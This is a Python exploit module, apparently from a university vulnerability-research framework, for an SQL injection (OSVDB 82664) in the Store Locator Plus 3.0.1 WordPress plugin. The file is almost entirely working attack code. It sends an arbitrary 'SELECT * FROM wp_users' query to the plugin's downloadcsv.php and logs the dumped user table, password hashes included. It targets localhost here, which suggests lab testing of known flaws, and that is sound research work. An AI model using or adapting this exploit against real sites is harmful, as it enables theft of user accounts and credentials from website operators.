
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import framework                        
import time
import re
import urllib
import httplib

class Exploit (framework.Exploit):
    attributes = {'Name' : "OSVDB_82664B",                        
                  'Description' : "SQL injection bug in downloadcsv.php",
                  'References' : [['OSVDB','82664'],['http://www.osvdb.org/show/osvdb/82664']],
                  'Target' : "Wordpress 3.2",
                  'TargetLicense' : '',
                  'Type' : "SQL",
                  'VulWikiPage' : "",
                  'Plugin' : "Store Locator Plus 3.0.1",
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.verified = False
        return

    def exploit(self):

        params = urllib.urlencode({'query':"SELECT * FROM wp_users",
                                   'filename':'test',
                                   'all':'true'})


        headers = {"Content-type": "application/x-www-form-urlencoded",
                   "Accept": "text/plain"}
        conn = httplib.HTTPConnection("127.0.0.1:80")
        conn.request("POST",
                     "/wordpress/wp-content/plugins/store-locator-le/downloadcsv.php",
                     params,
                     headers)

        response = conn.getresponse()
     
        data = response.read()
        conn.close()
   
        re_comp = re.compile(".?(,[^,]*){9}")
        extract = re_comp.search(data)
        if(extract != None):
            self.verified = True
            self.logger.info("Extracted wp_users table: %s", data)
            
        self.logger.info("Extracted wp_users table: %s", data)

        return                

    def verify(self):
        return self.verified
